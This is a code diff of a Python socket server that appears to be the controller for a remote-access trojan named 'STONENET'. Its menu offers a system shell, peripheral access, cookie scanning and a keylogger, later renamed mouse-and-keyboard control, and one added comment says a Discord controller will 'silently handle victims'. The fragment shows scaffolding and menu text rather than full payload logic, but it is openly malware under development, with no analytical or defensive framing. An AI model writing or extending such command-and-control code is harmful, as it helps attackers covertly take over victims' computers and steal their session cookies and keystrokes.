@@ -4,13 +4,12 @@ import socket
 ADDR = '192.168.1.77'#portforwarding FTW! if you are looking to test this dr. use loopback
 PORT = 7771
 
-#setting up class structure for later after socket testing
 class Server:
     def __init__(self, addr, port):
         self.ADDRESS = addr
         self.PORT = port
 
-    #going to make this for a single client first then come back and add threading to handle multiple clients
+    #dont have to worry about blocking sockets and multiple clients as discord controller will silently handle victims.
     def startServer(self):
         print("WELCOME TO STONENET")
         print(f"Starting Server on {ADDR} port {PORT}...")
@@ -23,7 +22,7 @@ class Server:
                 #starting main shell loop. only shell commands right now will come to add more advanced preset scripts and such.
                 print("Connected to Client. Initiating Main Menu....")
                 while True:
-                    Choice = input("Select number from the Following Options:\n1) Basic System Shell\n2) Open Peripherals\n3) Scan For Cookies\n4) Keylogger\n5) Exit\n> ")
+                    Choice = input("Select number from the Following Options:\n1) Basic System Shell\n2) Open Peripherals\n3) Scan For Cookies\n4) Control M&K\n5) Exit\n> ")
                     #basic shell loop
                     if Choice == "1":
                         while True:
